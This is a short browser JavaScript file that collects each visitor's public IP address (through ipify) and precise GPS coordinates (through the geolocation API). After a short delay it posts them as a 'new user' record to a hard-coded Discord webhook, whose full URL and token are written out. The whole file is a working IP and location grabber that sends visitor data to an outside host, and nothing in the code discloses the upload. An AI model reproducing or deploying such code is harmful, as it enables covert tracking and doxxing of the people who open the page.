has_ip = false
located = false


function discord_msg(mesage) {
    fetch("https://discordapp.com/api/webhooks/1314333297173856328/cUtaTn4ds-wtmXm1BUIlGFzRg_eSVpKtNa3tchU00AjmC2PvlQWG9TlJ0d4_vTPOgQYQ", {
        body: JSON.stringify({
          content: mesage,
        }),
        headers: {
          "Content-Type": "application/json",
        },
        method: "POST",
      })
        .then(function (res) {
          console.log(res);
        })
        .catch(function (res) {
          console.log(res);
        });
};

async function get_ip() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        let data = await response.json();
         ipv4 = data.ip
         document.getElementById("ip").innerText = ipv4
         has_ip = true
    }
        catch (error) {
        console.error('Error fetching IP address:', error);
        };
};

    function get_location() {
    watchID = navigator.geolocation.watchPosition((position) => {
        latitude = position.coords.latitude;
        longitude = position.coords.longitude;
        document.getElementById("location").innerText = (latitude + " " + longitude);
        located = true
      });
};

const sleep = (delay) => new Promise((resolve) => setTimeout(resolve, delay))


const send_to_discord = async () => {
    await sleep(3000)
    discord_msg("---------------------")
    await sleep(200)
    discord_msg("new user: ")
    await sleep(200)
    if (has_ip) {
        i = discord_msg("ipv4: " + ipv4)
    } else {
        discord_msg("ipv4: n/a")
    }
    await sleep(200)
    if (located) {
        discord_msg("location: " + latitude + ", " + longitude)
    } else {
        discord_msg("location: n/a")
    }
}

get_ip()
get_location()
send_to_discord()

